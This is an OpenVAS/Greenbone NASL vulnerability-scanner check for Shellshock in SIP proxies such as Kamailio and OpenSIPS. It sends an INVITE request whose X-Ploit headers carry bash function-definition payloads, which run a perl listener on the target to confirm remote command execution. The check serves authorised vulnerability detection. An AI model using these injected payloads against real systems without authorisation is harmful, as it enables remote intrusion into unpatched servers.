# Copyright (C) 2014 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105093");
  script_version("2022-08-09T10:11:17+0000");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2014-6271", "CVE-2014-6278");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2022-08-09 10:11:17 +0000 (Tue, 09 Aug 2022)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-02-01 21:38:00 +0000 (Mon, 01 Feb 2021)");
  script_tag(name:"creation_date", value:"2014-09-29 11:47:16 +0530 (Mon, 29 Sep 2014)");
  script_name("GNU Bash Environment Variable Handling RCE Vulnerability (Shellshock, SIP, CVE-2014-6271/CVE-2014-6278) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("sip_detection.nasl", "sip_detection_tcp.nasl");
  script_mandatory_keys("sip/detected");

  script_xref(name:"URL", value:"https://access.redhat.com/security/vulnerabilities/shellshock");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70103");
  script_xref(name:"URL", value:"https://access.redhat.com/solutions/1207723");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=1141597");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210420171418/https://blogs.akamai.com/2014/09/environment-bashing.html");
  script_xref(name:"URL", value:"https://blog.qualys.com/vulnerabilities-threat-research/2014/09/24/bash-shellshock-vulnerability");
  script_xref(name:"URL", value:"https://blog.qualys.com/vulnerabilities-threat-research/2014/09/24/bash-remote-code-execution-vulnerability-cve-2014-6271");
  script_xref(name:"URL", value:"https://shellshocker.net/");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/252743");
  script_xref(name:"URL", value:"https://github.com/zaf/sipshock");

  script_tag(name:"summary", value:"GNU Bash is prone to a remote command execution (RCE)
  vulnerability dubbed 'Shellshock'.");

  script_tag(name:"vuldetect", value:"Sends a crafted SIP INVITE request and checks the response.");

  script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered when evaluating
  environment variables passed from another environment. After processing a function definition,
  bash continues to process trailing strings.

  The exec module in Kamailio, Opensips and probably every other SER fork passes the received SIP
  headers as environment variables to the invoking shell. A proxy is vulnerable using any of the
  exec functions and has the 'setvars' parameter set to the default value '1'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote or local attackers to
  inject shell commands, allowing local privilege escalation or remote command execution depending
  on the application vector.");

  script_tag(name:"affected", value:"GNU Bash versions 1.0.3 through 4.3.");

  script_tag(name:"solution", value:"Update to patch version bash43-025 of Bash 4.3 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("port_service_func.inc");
include("sip.inc");

infos = sip_get_port_proto( default_port:"5060", default_proto:"udp" );
port = infos["port"];
proto = infos["proto"];

host = get_host_name();

soc = sip_open_socket( port:port, proto:proto );
if( ! soc )
  exit( 0 );

vtstrings = get_vt_strings();
from_default = vtstrings["default"];
from_lower   = vtstrings["lowercase"];

nc_port = rand() % 64512 + 1024;
rand = from_default + "-" + rand_str( length:28 );

perl = 'perl -MIO::Socket -e \'my $l = new IO::Socket::INET(LocalPort => "' + nc_port  +
       '", Proto =>"tcp", Listen => 1, Reuse => 1) or die;  local $SIG{ALRM} =' +
       ' sub { die; }; alarm 10; if(my $s = $l->accept()) { print $s "' + rand + '"; exit; }\'';

sip = 'v=0\r\n' +
      'o=- 20800 20800 IN IP4 ' + get_host_ip()  + '\r\n' +
      's=SDP data\r\n' +
      'c=IN IP4 ' + get_host_ip()  + '\r\n' +
      't=0 0\r\n' +
      'm=audio 11796 RTP/AVP 18 101\r\n' +
      'a=rtpmap:18 G729/8000\r\n' +
      'a=fmtp:18 annexb=no\r\n' +
      'a=fmtp:101 0-15\r\n' +
      'a=rtpmap:101 telephone-event/8000\r\n' +
      'a=ptime:20' +
      'a=sendrecv\r\n\r\n';

req = 'INVITE sip:0987654321@' + host + ' SIP/2.0\r\n' +
      'Via: SIP/2.0/' + toupper( proto ) + ' ' + this_host() + ':' + port + ';branch=z9hG4bK724588683\r\n' +
      'From: "' + from_default + '" <sip:0123456789@' + this_host() + '>;tag=784218059\r\n' +
      'To: <sip:0987654321@' + host + ':' + port + '>\r\n' +
      'Call-ID: ' + rand() + '\r\n' +
      'CSeq: 1 INVITE\r\n' +
      'Contact: <sip:0123456789@' + host + ':' + port + '>\r\n' +
      'Content-Type: application/sdp\r\n' +
      'Allow: INVITE, INFO, PRACK, ACK, BYE, CANCEL, OPTIONS, NOTIFY, REGISTER, SUBSCRIBE, REFER, PUBLISH, UPDATE, MESSAGE\r\n' +
      'Max-Forwards: 70\r\n' +
      'User-Agent: ' + from_default + '-' + OPENVAS_VERSION + '\r\n' +
      'X-Ploit: () { ' + from_default + ':; }; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; ' + perl + '\r\n' +
      'X-Ploit1: () { _; } >_[$($())] { PATH=/usr/bin:/usr/local/bin:/bin; export PATH; ' + perl + '; }\r\n' +
      'Supported: replaces\r\n' +
      'Expires: 360\r\n' +
      'Allow-Events: talk,hold,conference,refer,check-sync\r\n' +
      'Content-Length: ' + strlen( sip ) + '\r\n\r\n' +
      sip;

send( socket:soc, data:req );

sleep( 1 ); # some sip servers don't reply to this request but exploit is executed...so just sleep...
close( soc );

soc = open_sock_tcp( nc_port );
if( ! soc )
  exit( 99 );

recv = recv( socket:soc, length:64 );
close( soc );

if( rand >< recv ) {
  security_message( port:port, proto:proto );
  exit( 0 );
}

exit( 99 );
